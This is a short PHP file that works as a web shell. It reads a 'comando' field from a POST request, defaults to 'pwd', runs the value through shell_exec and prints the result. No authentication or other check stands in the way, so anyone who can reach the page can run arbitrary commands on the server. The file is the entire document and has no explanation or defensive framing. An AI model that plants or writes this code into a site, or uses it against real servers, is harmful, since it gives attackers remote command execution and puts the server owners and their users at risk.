<?php
	$comando = "pwd";
	if(isset($_POST["comando"]))
		$comando = $_POST["comando"];
	$resp = shell_exec($comando);
	echo $resp;
?>